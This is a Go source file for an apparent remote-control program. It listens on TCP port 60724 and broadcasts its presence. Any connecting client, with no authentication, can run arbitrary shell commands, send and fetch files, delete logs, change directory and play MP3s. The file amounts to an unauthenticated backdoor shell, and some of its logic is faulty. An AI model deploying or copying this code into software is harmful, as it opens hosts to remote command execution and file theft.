package main

import (
	"./lib"
	"./lib/sound"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var (
	path        = strings.Split(os.Args[0], `\`)
	Path        = strings.Join(path[:len(path)-1], `\`)
	server      net.Listener
	SelfIp, _   = lib.GetSelfIp()
)

func catchError(err error) bool {
	if err != nil {
		if lib.LogWrite(err.Error(), Path) != nil {
			log.Fatal(err)
		}
		return true
	}
	return false
}

func mp3Play(cmd string, args []string) int {
	if cmd == "play" {
		player := sound.Player{Filename: strings.Join(args, " "), Alias: "RBM"}
		player.Load()
		return player.Play()
	} else {
		command := append([]string{cmd}, args...)
		code := sound.Execute(strings.Join(command, " "))
		return code
	}
}

func logFunc(args []string, conn net.Conn) string {
	if len(args) < 2 {
		return "Missing param"
	}
	if args[0] == "get" {
		_path := fmt.Sprintf("%s/.log/%s", Path, args[1])
		if !(lib.Exists(_path)) {
			return "No such file"
		}
		err := lib.SendFile(conn, Path)
		if !(catchError(err)) {
			return "Done"
		} else {
			return "Get failure"
		}
	} else if args[0] == "rm" {
		var err error
		if len(args) > 2 {
			var errs []string
			for _, file := range args[1:] {
				err := os.Remove(fmt.Sprintf("%s/.log/%s", Path, file))
				if err != nil {
					errs = append(errs, err.Error())
				}
			}
			err = errors.New(strings.Join(errs, "\n"))
		} else if args[1] != "-a" {
			err = os.Remove(fmt.Sprintf("%s/.log/%s", Path, args[1]))
		} else {
			err = os.RemoveAll(fmt.Sprintf("%s/.log", Path))
		}
		if err != nil {
			return err.Error()
		}
	}
	return "Param error"
}

func mainLoop() error {
	go lib.Broadcast()

	for {
		conn, err := server.Accept()
		if err != nil {
			return err
		}

		data := make([]byte, 60724)
		var output = []byte(" ")
		var result = ""

		err = lib.LogWrite(fmt.Sprintf("%s connect", conn.RemoteAddr()), Path)
		if err != nil {
			return err
		}

		for {
			l, err := conn.Read(data)
			data = data[:l]

			if err != nil {
				return err
			}
			cmd := strings.Split(string(data), " ")
			_ = lib.LogWrite(strings.Join(cmd, " "), Path)

			if cmd[0] == "exit" {
				conn.Close()
				break
			} else if cmd[0] == "sendfile" {
				err = lib.RecvFile(conn)
				if catchError(err) {
					result = err.Error()
				} else {
					result = "Successful"
				}
			} else if cmd[0] == "getfile" {
				if len(cmd) != 2 {
					err = lib.SendData(conn, []byte("Param error"))
					if catchError(err) {
						return err
					}
				} else if !(lib.Exists(cmd[1])) {
					err = lib.SendData(conn, []byte("No such file"))
					if catchError(err) {
						return err
					}
				} else {
					err = lib.SendData(conn, []byte("0"))
					if catchError(err) {
						return err
					}
					err = lib.SendFile(conn, cmd[1])
					if catchError(err) {
						return err
					}
				}
				continue
			} else if cmd[0] == "mp3" {
				if len(cmd) < 2 {
					result = "Missing param"
				} else {
					result = fmt.Sprintf("Executed code: %d", mp3Play(cmd[1], cmd[2:]))
				}
			} else if cmd[0] == "log" {
				result = logFunc(cmd[1:], conn)
			} else if cmd[0] == "cd" {
				result, err = lib.Cd(cmd[1:])
				if catchError(err) {
					result = err.Error()
				}
			} else {
				output, err = lib.Popen(strings.Join(cmd, " "))
				if catchError(err) {
					result = err.Error()
				}
			}

			if result != "" {
				data = []byte(result)
			} else {
				data = output
			}

			err = lib.SendData(conn, data)
			if catchError(err) {
				return err
			}
		}
	}
}

func main() {
	var err error
	if !(lib.Exists("dl")) {
		catchError(os.Mkdir("dl", os.ModePerm))
	}
	if !(lib.Exists(".log")) {
		catchError(os.Mkdir(".log", os.ModePerm))
	}

	_ = lib.ReleasePort()

	tcpAddr, _ := net.ResolveTCPAddr("tcp4", SelfIp+":60724")
	server, err = net.ListenTCP("tcp", tcpAddr)
	catchError(err)
	defer server.Close()

	for {
		catchError(mainLoop())
	}
}
